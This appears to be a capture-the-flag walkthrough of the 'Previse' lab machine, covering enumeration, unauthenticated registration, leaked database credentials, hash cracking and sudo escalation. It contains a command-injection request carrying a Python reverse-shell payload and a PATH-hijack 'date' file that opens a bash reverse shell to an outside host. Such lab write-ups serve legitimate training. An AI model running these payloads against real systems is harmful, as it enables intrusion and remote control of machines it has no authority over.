# Enum

### Nmap Scan

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

***
# Footholding

Since every page found by Fuzzing is redirecting to `login.php`

Used `cURL` to get Souce Code of page

```bash
curl 10.129.159.224
```

On further Exploring A page `accounts.php` seems to register new Users

```bash
curl 10.129.159.224/accounts.php -X POST -d "username=admin45&password=password45&confirm=password45"
```


downloaded `siteBackup.zip` which was uploaded by some user

***

From `config.php` found `mysql` database Credentials

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

***

# Getting Shell

On Further reading the source code of php webpages

`logs.php` have `exec()` function which is used to execute commands in `php`

Intercepting the request using `Burp` and Forwarding the request with `payload`

```text
POST /logs.php HTTP/1.1
Host: 10.129.160.202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://10.129.160.202
Connection: close
Referer: http://10.129.160.202/file_logs.php
Cookie: PHPSESSID=tnnt0rgfqnuo95n2d5017blmdr
Upgrade-Insecure-Requests: 1

delim=<PAYLOAD>
```

**Payload**

Send in `url-encoding`

```text
PAYLOAD :
comma & python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.10.14.56",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

***

# Lateral Movement

Got the shell as `www-data` user

Upgrading Reverse Shell

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

##### Accessing `MYSQL`

Using Credentails found Before

```bash
 mysql -u root -p previse
```

```mysql
show tables;

select * from accounts;	
```

Found `hash` for `m4lwhere` user

```text
m4lwhere: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. 
```

Cracking The hash using `john`
with **format :** ` md5crypt-long`  
**wordlist :** ` rockyou.txt`
Password : `ilovecody112235!`

- `SSH` into machine as `m4lwhere` user with above Passwd

***

# Prev ESC

Checking Commands allowed to run as `root` : `sudo -l`
  
 ```text
User m4lwhere may run the following commands on previse:                                                                                                             
    (root) /opt/scripts/access_backup.sh 
```

On reading the `access_backup.sh` 
`date` command can be played with
 
```bash
export PATH=/tmp:$PATH
cd tmp/
echo "bash -i >& /dev/tcp/10.10.14.56/4242 0>&1" > date
chmod +x date
sudo /opt/scripts/access_backup.sh
```


***
# Resource

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)

***
